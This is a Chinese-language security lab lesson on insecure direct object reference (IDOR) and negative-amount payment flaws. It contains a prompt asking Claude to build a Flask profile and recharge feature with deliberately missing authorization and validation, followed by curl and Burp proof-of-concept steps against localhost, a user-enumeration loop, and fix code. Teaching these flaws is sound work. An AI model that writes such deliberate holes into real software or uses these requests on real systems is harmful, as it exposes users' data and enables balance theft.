# Day 5 - 越权与支付逻辑漏洞

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的登录、注册、搜索、头像上传功能基础上，继续增加个人中心和充值功能。保持原有功能不变。

### 在 app.py 中新增以下路由：

1. 新增路由 /profile，支持 GET：
   - 从 URL 参数获取 user_id（如 /profile?user_id=1）
   - 根据 user_id 从用户数据中查询资料（邮箱、手机、余额）
   - 将查询结果显示在个人中心页面
   - 不要验证当前登录用户和要查询的 user_id 是否匹配
   - 管理员和普通用户的资料都可以通过修改 URL 参数来查看

2. 新增路由 /recharge，支持 POST：
   - 从表单接收 user_id 和 amount 参数
   - 直接修改用户数据中的余额字段：balance = balance + amount
   - 不要检查 amount 是否为负数
   - 充值成功后重定向到 /profile?user_id={user_id}

### 新增 templates/profile.html

个人中心页面，继承 base.html，包含：
- 显示用户信息：ID、用户名、邮箱、手机、余额
- 充值表单：金额输入框、充值按钮（提交到 /recharge）
- 使用隐藏字段传递 user_id

### 修改 templates/base.html

- 在导航栏登录后的菜单中添加"个人中心"链接

### 修改 templates/index.html

- 在已登录状态下的欢迎页面中添加"个人中心"的快捷入口

### 代码规范要求
- user_id 必须从 URL 参数或表单参数获取，不能从 session 获取
- 不要验证当前用户是否有权查看其他用户的资料
- amount 参数不要做正负校验
- 不要添加任何权限检查

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 在上次功能基础上增加个人中心和充值 |
| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
| 3 | 终端运行 `python app.py` | 启动项目 |
| 4 | 用普通用户登录，测试越权访问 | 见下方 POC |
| 5 | 分析代码，编写修复到 fix/user_service_fix.py | 修复漏洞 |
| 6 | `git add -A && git commit -m "day-05: 个人中心充值 + 越权支付修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞 1：水平越权（IDOR）

```python
# 提示词明确要求：user_id 从 URL 参数获取，不要验证是否匹配当前用户
user_id = request.args.get('user_id', '1')
# 直接查询该 user_id 的数据，不检查是否当前登录用户
```

**危害**：普通用户 alice 登录后，修改 URL 中的 `user_id=1` 即可查看管理员 admin 的详细资料（邮箱、手机、余额等）。

### 漏洞 2：支付逻辑漏洞 - 负金额

```python
# 提示词明确要求：不要检查 amount 是否为负数
amount = float(request.form.get('amount', '0'))
balance = balance + amount  # amount = -10000 时，余额反而减少
```

**危害**：攻击者可以输入负金额"充值"，导致他人余额减少，或利用此漏洞进行不正当交易。

### 漏洞 3：SQL 注入（充值功能）

提示词要求使用字符串拼接 SQL，充值功能同样存在 SQL 注入风险。

---

## 四、POC 代码

### POC 1：水平越权

```bash
# 以普通用户 alice 登录
curl http://127.0.0.1:5000/login -d "username=alice&password=alice2025" -c /tmp/cookies.txt

# 查看自己的资料（user_id=2）
curl "http://127.0.0.1:5000/profile?user_id=2" -b /tmp/cookies.txt

# 越权查看 admin 资料（user_id=1）
curl "http://127.0.0.1:5000/profile?user_id=1" -b /tmp/cookies.txt
```

**预期结果**：alice 可以查看 admin 的所有信息。

### POC 2：遍历所有用户

```bash
# 用 alice 的身份遍历用户
for i in 1 2 3 4 5; do
  echo "=== user_id=$i ==="
  curl "http://127.0.0.1:5000/profile?user_id=$i" -b /tmp/cookies.txt | grep -E "ID|用户名|邮箱|手机|余额"
done
```

### POC 3：负金额充值

```bash
# alice 给 admin 充值负金额（扣钱）
curl http://127.0.0.1:5000/recharge -b /tmp/cookies.txt -d "user_id=1&amount=-5000"

# 验证 admin 余额减少
curl "http://127.0.0.1:5000/profile?user_id=1" -b /tmp/cookies.txt
```

**预期结果**：admin 的余额减少（变负数），说明负金额没有被拦截。

---

## 五、Burp Suite 测试方法

### 测试越权

1. 以 alice 登录
2. 访问 `/profile?user_id=2` 查看自己的资料
3. 将请求发送到 Repeater
4. 修改 `user_id=2` 为 `user_id=1`
5. 发送请求，观察响应中显示的是 admin 的资料

### 测试支付漏洞

1. 拦截 POST /recharge 请求
2. 修改 `amount=100` 为 `amount=-10000`
3. 放行请求
4. 访问 `/profile?user_id=1` 查看余额是否减少

---

## 六、POC 代码详细解释

### POC 1 详解：IDOR

```
攻击流程：

1. alice 登录（获得 Cookie）
   POST /login → username=alice&password=alice2025
   ← Set-Cookie: session=xxx

2. alice 查看自己的资料（正常）
   GET /profile?user_id=2
   ← 显示 alice 的信息

3. alice 修改 URL 参数（越权）
   GET /profile?user_id=1     ← 把 2 改成 1
   ← 显示 admin 的信息        ← 不应该允许！

为什么后端没拦截？
   app.py 中：
     user_id = request.args.get('user_id', '1')
     # 没有检查 session['username'] 对应的 user_id 是否等于请求的 user_id
     # 没有检查当前用户角色是否为 admin
     # 直接查询并返回数据
```

### POC 3 详解：负金额

```
正常充值：
  POST /recharge → user_id=1&amount=100
  SQL: UPDATE users SET balance = balance + 100 WHERE id = 1
  结果: admin 余额增加了 100 元

恶意充值：
  POST /recharge → user_id=1&amount=-5000
  SQL: UPDATE users SET balance = balance + (-5000) WHERE id = 1
  结果: admin 余额减少了 5000 元

问题：amount 没有校验正负，-5000 被直接用于 SQL 计算
```

---

## 七、修复方案

创建 `fix/user_service_fix.py`：

```python
from flask import session

def get_profile_fixed(user_id):
    """修复：验证当前用户只能查看自己的资料"""
    current_user = session.get('username')
    # 修复：校验 user_id 是否匹配当前用户
    # 可以通过查询数据库获取当前用户的 user_id
    if not is_owner(current_user, user_id):
        return None  # 拒绝访问
    # ... 正常查询逻辑

def recharge_fixed(user_id, amount):
    """修复：校验金额正负和身份"""
    # 修复 1：只能给自己充值
    if not is_owner(session.get('username'), user_id):
        return {"success": False, "message": "不能为他人充值"}

    # 修复 2：金额必须为正数
    if amount <= 0:
        return {"success": False, "message": "金额必须为正数"}

    # 修复 3：金额上限
    if amount > 10000:
        return {"success": False, "message": "单次充值不能超过10000元"}

    # 修复 4：使用参数化查询
    # cursor.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id))
```

---

## 八、漏洞复现检查清单

| # | 检查项 | 命令 | 预期结果 |
|---|--------|------|---------|
| 1 | 水平越权 | alice 查看 `/profile?user_id=1` | 能看到 admin 的资料 |
| 2 | 遍历用户 | for 循环 user_id 1~5 | 都能访问（不存在的返回空） |
| 3 | 负金额充值 | `amount=-5000` | 余额减少 |
| 4 | 越权充值 | alice 给 admin 充值 | 提示成功（不应允许） |

---

## 九、课后任务

1. 用 alice 登录后尝试越权查看 admin 的资料
2. 尝试给 admin 充值负金额
3. 在 fix/ 目录下编写修复代码，添加权限校验和金额校验
4. 验证修复后越权访问被拒绝、负金额被拦截
5. 思考：即使修复了越权，充值功能是否还有 SQL 注入风险？
6. 提交到自己的个人分支
